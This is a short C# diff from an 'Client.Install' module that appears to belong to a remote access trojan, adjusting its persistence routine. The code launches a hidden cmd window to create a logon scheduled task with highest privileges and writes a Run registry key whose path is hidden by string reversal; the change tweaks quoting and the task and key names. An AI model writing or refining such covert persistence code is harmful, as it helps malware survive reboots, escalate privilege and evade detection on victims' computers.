@@ -34,7 +34,7 @@ namespace Client.Install
                         Process.Start(new ProcessStartInfo
                         {
                             FileName = "cmd",
-                            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + Path.GetFileNameWithoutExtension(currentProcess) + " /tr " + "'" + "\"" + installPath.FullName + "\"" + "' & exit",
+                            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(installPath.Name) + "\"" + " /tr " + "'" + "\"" + installPath.FullName + "\"" + "' & exit",
                             WindowStyle = ProcessWindowStyle.Hidden,
                             CreateNoWindow = true,
                         });
@@ -43,7 +43,7 @@ namespace Client.Install
                     {
                         using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Strings.StrReverse(@"\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
                         {
-                            key.SetValue(Path.GetFileNameWithoutExtension(installPath.FullName), "\"" + installPath.FullName + "\"");
+                            key.SetValue(Path.GetFileNameWithoutExtension(installPath.Name), "\"" + installPath.FullName + "\"");
                         }
                     }
 
